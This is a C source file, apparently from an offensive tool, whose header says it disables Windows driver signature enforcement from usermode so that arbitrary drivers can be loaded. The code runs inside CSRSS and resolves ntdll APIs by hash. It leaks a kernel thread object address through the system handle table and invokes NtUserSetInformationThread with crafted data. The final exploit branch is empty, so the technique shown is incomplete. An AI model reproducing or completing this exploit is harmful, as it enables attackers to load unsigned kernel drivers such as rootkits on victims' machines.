/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Disables driver signing enforcement for
 * the system, allowing an arbitrary user
 * to load drivers.
 *
 * Runs within CSRSS and executes the sys
 * call.
 *
**/

D_SEC( C ) VOID WINAPI DsePatch( PVOID Parameter )
{
	ULONG				Len = sizeof( SYSTEM_HANDLE_INFORMATION );
	PVOID				Obf = NULL;
	PVOID				Thd = NULL;
	PVOID				Mgr = NULL;
	PSYSTEM_HANDLE_INFORMATION	Sys = NULL;

	API				Api;
	OBJECT_ATTRIBUTES		Obj;
	DESKTOPRESTOREDATA		Des;
	USERTHREAD_USEDESKTOP		Usr;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );
	RtlSecureZeroMemory( &Des, sizeof( Des ) );

	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
	Api.RtlCreateUserThread      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );
	Api.NtWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlReAllocateHeap        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlGetVersion            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
	Api.NtOpenThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENTHREAD );
	Api.RtlFreeHeap		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.DbgPrint		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_DBGPRINT );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Obj.Length = sizeof( OBJECT_ATTRIBUTES );
	if ( ! Api.NtOpenThread( &Thd, THREAD_ALL_ACCESS, &Obj, &NtCurrentTeb()->ClientId ) ) {
		/* Create the initial allocation */
		Mgr = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
		Sys = Api.RtlAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Len );

		/* Try to allocate the correct buffer size to get the lenght */
		while ( Api.NtQuerySystemInformation( SystemHandleInformation, Sys, Len, NULL ) == STATUS_INFO_LENGTH_MISMATCH ) {
			Sys = Api.RtlReAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Sys, Len += sizeof( SYSTEM_HANDLE_INFORMATION ) );
			
			/* :( abort */
			if ( ! Sys ) {
				break;
			};
		};

		/* Good? Enum! */
		if ( Sys != NULL ) {
			for ( INT Idx = 0 ; Idx < Sys->NumberOfHandles ; ++Idx ) {
				/* Is our process? */
				if ( Sys->Handles[ Idx ].UniqueProcessId == ( ( USHORT )( NtCurrentTeb()->ClientId.UniqueProcess ) ) ) {
					/* Is our handle? */
					if ( Sys->Handles[ Idx ].HandleValue == ( ( USHORT )( Thd ) ) ) {
						/* Object Address! */
						Obf = C_PTR( Sys->Handles[ Idx ].Object );
						break;
					};
				};
			};

			/* Good! */
			if ( Obf != NULL ) {
				Usr.hThread              = NULL;
				Usr.Restore.pDeskRestore = NULL;
				Usr.Restore.pDeskNew     = NULL;

				if ( ! NtUserSetInformationThread( ( ( HANDLE ) - 2 ), 7, &Usr, sizeof( Usr ) ) ) {

				};
			};
			Api.RtlFreeHeap( Mgr, 0, Sys );
		};
		Api.NtClose( Thd );
	};
};
